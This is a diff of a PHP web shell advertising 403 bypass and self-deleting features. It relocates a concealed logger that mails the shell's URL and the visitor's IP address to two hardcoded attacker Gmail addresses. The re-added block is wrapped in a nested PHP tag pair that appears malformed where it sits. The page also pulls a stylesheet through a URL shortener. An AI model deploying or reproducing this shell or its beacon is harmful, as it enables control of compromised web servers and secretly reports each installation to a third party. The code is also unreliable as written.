@@ -5,16 +5,6 @@
     Bypass 403 Forbidden / Auto Delete Shell / PHP Malware Detector / Minishell Bypass 403
 */
 
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'chokkaxploiter@gmail.com, chokkagans@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-
 set_time_limit(0);
 error_reporting(0);
 error_log(0);
@@ -31,6 +21,18 @@ if (get_magic_quotes_gpc()) {
         $_POST[$key] = stripslashes($value);
     }
 }
+
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'chokkaxploiter@gmail.com, chokkagans@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
 
 echo '<!DOCTYPE html><html><head><link href="https://urlis.net/b4paty1" rel="stylesheet" type="text/css"><title>xXx SICUKI1337 xXx</title></head><body style=background-color:black;>';
 echo '<div style="color:red;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
